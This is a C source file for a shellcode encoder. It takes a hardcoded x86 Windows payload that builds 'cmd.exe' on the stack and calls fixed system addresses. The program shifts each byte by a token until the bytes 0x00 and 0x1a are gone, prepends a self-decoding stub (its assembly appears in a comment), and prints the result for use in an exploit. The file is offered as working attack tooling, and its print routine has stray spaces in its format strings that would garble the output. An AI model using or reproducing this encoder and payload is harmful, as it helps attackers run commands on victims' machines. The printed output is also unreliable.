#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 jmp short one
 decoder:
 pop esi
 xor ecx , ecx
 mov byte cl , 0
 loop:
 sub byte [esi + ecx - 1], 0
 dec ecx
 jnz loop
 jmp short codedShellcode
 one:
 call decoder
 codedShellcode:
*/

/*this payload can't contain x00 & x1a*/
char payload[] = "\x55\x89\xE5\x31\xC0\xB0\x08\x29\xC4\x31\xC0\xC6\x45\xF8\x63"
                 "\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC"
                 "\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x88\x45\xFF\x8D\x5D\xF8"
                 "\x40\x50\x53\xE8\xB8\x1A\x46\x7C\x31\xC0\x40\xE8\xD5\xBA\x41"
                 "\x7C";

char decoder [] = "\xeb\x0f\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\x49\x75"
                  "\xf8\xeb\x05\xe8\xec\xff\xff\xff";

void print_shell(char *data)
{
    int i, l = 15;                   
    for (i = 0; i < strlen (data); ++i)
    {
        if(l >= 15)
        {
            if(i) printf (" \"\n");
            printf ("\t\"");
            l = 0;
        }
        ++l;
        printf ("\\x %02x", (( unsigned char *) data )[i]);
    }
    printf (" \";\ n\n\n");
}

int main(int argc, char *argv[])
{
    int i = 0;
    int token = 1, badchar = 0;
    int tries = 0;        
    
    printf("SUM - Encoder\n");
    printf("Works with payloads SHORTER than 256 bytes only\n");
    printf("-----------------------------------------------\n\n"); 
   
    int lpayload = sizeof(payload) - 1;    
       
    printf("payload length: %d\n", lpayload);      

    decoder[6] =  lpayload; 
    
    do
    {
        if(badchar == 1)
        {
               for(i = 0; i< lpayload; i++) 
                    payload[i] -= token;    
               token++;
               decoder[11] = token;
               badchar = 0;
        }
        for(i = 0; i < lpayload ; i++)
        {
               payload[i] += token; 
               if(payload[i] == 0x00 || payload[i] == 0x1a)
               {
                     badchar = 1;                     
               }            
        }
        tries++;
        printf("try %2d\n", tries);        
    }while(badchar == 1 && token < 128);
    
    int ldecoder = strlen(decoder);    

    char *result = calloc(1, lpayload + ldecoder );    
  
    strcpy(result, decoder);
    memcpy(result + ldecoder, payload, lpayload);
    
    print_shell(result);

    free(result);
    getchar();
    return 0;
}
